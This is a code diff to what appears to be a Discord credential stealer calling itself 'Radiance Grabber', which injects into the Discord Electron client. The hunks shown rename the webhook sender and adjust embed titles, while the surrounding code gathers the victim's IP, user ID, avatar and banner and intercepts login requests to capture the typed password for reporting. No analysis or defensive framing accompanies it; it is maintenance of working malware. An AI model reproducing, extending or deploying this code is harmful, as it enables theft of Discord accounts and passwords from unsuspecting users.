@@ -59,10 +59,10 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "AdB2GD31sf2SF76",
+        username: "Radiance Grabber",
         content: "",
         embeds: [{
-            title: "Discord was opened",
+            title: title,
             color: config["embed-color"],
             fields: fields,
             description: description ?? "",
@@ -222,8 +222,7 @@ const FirstTime = async () => {
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`);
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`);
         var params = await makeEmbed({
-            name: `\`${user.username}\``,
-            title: "User Information",
+            title: `\`${user.username}\``,
             fields: [
                 { name: "IP", value: `\`${ip}\``, inline: false },
                 { name: "ID", value: `\`${user.id}\``, inline: false },
@@ -343,8 +342,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                name: `\`${user.username}\``,
-                title: "User Information",
+                title: `\`${user.username}\``,
                 fields: [
                     { name: "IP", value: `\`${ip}\``, inline: false },
                     { name: "ID", value: `\`${user.id}\``, inline: false },
